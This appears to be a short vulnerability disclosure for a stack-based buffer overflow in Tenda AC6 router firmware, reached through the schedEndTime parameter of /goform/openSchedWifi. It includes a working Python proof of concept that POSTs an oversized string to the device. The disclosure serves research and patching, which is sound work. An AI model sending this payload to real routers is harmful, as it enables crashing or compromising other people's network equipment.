Tenda AC6 **V15.03.05.16** has a stack overflow vulnerability. The vulnerability affects the file /goform/openSchedWifi function setSchedWifi. Setting the schedEndTime parameter causes a stack-based buffer overflow.

![](api/attachments/6zraflQZ105X/image/image.png)

![](api/attachments/V6yTKP4NeXX3/image/image.png)

### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/openSchedWifi"

data = {
    "schedWifiEnable": "Raining101",
    "schedEndTime": "Raining" * 2000 
}

response = requests.post(url, data=data)
print(response.status_code)
print(response.text)
```

![](api/attachments/qR7BsjmYHNvY/image/image.png)
